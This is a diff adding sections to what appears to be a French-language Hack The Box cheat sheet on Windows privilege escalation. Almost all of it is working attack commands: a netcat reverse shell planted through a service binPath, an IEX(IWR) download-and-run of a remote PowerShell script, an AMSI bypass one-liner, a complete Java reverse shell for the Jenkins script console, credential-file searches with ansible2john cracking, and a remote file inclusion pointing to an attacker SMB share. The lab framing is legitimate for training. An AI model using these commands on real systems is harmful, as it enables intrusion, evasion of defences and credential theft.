@@ -161,3 +161,89 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
 
 # More techniques coming soon...
 ```
+
+## Techniques d'élévation de privilèges Windows dans des Box
+### Modification des binaires de service
+Exemple (Return):
+```bash
+# Remplacer un binaire de service par un reverse shell
+upload /usr/share/windows-resources/binaries/nc.exe
+sc.exe config VMTools binPath="C:\path\to\nc.exe -e cmd.exe <IP> <PORT>"
+sc.exe stop VMTools
+sc.exe start VMTools
+```
+### Exploitation des services mal configurés
+Exemple (Arctic):
+
+```bash
+# Identifier les services vulnérables
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+
+# Vérifier les permissions sur les binaires de service
+icacls "C:\path\to\service.exe"
+```
+## Restricted Environments
+### Contournement des restrictions PowerShell
+Exemple (Remote):
+```bash
+# Exécution de code PowerShell à distance
+IEX(IWR http://<IP>:<PORT>/rev.ps1 -UseBasicParsing)
+
+# Contournement d'AMSI
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+### Exploitation des interfaces restreintes
+Exemple (Jeeves):
+```bash
+# Exploitation de la console de script Jenkins
+String host="<IP>";
+int port=<PORT>;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s=new Socket(host,port);
+InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+## Credential Theft
+### Extraction de mots de passe en clair
+Exemple (Sniper):
+```bash
+# Recherche de mots de passe dans les fichiers de configuration
+type ..\user\db.php
+
+# Recherche de fichiers sensibles
+dir /s /b *pass*.txt *cred* *vnc* *.config*
+```
+### Exploitation des fichiers de configuration
+Exemple (Authority):
+```powershell
+# Extraction de mots de passe depuis des fichiers de configuration
+type C:\path\to\config.xml
+
+# Utilisation d'outils spécialisés pour le cracking
+ansible2john ansible_inventory > hash.txt
+john hash.txt
+```
+### Exploitation des flux de données alternatifs (ADS)
+Exemple (Jeeves):
+```bash
+# Lister les flux de données alternatifs
+dir /R
+
+# Lire le contenu d'un flux de données alternatif
+more < hm.txt:root.txt
+```
+## Other Stuff
+### Exploitation des vulnérabilités d'applications web
+#### Exploitation des injections de fichiers à distance (RFI)
+Exemple (Sniper):
+```bash
+# Configuration d'un partage SMB malveillant
+mkdir /var/www/html/sniper
+chmod 0555 /var/www/html/sniper/
+chown -R nobody:nogroup /var/www/html/sniper/
+
+# Exploitation de l'inclusion de fichier à distance
+http://<IP>/blog/?lang=\\<ATTACKER_IP>\sniper\box.php
+```
